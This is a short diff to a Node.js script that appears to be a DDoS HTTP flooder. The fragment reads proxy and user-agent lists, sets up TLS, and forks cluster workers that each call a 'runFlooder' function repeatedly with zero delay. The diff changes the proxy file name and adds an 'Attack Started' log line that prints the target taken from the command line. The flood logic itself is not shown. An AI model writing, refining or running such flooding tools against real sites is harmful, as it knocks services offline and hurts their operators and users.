@@ -57,7 +57,7 @@
  
  const secureContext = tls.createSecureContext(secureContextOptions);
  
- var proxyFile = "proxy.txt";
+ var proxyFile = "http.txt";
  var proxies = readLines(proxyFile);
  var userAgents = readLines("ua.txt");
  
@@ -72,11 +72,10 @@
 
  if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
-        //console.log("Threads " + counter +  " started.");
+        console.log(`Attack Started | ${process.argv[2]}`);
         cluster.fork();
     }
 } else {for (let i = 0; i < 10; i++) { setInterval(runFlooder, 0) }}
- 
  class NetSocket {
      constructor(){}
  
